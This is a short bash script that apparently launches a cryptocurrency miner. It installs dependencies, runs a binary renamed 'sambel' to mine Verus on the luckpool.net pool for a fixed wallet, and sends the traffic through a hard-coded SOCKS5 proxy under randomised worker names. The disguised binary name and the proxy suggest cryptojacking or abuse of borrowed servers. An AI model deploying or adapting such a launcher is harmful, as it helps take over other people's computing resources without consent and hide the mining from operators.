#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x sambel
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RTYdzcR1YraQQXz2MsKfMyTbDb35MY2x3G
WORKER=$(echo $(shuf -i 1-7 -n 1)-REVOKE)
PROXY=socks5://209.97.150.167:1080
./sambel -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
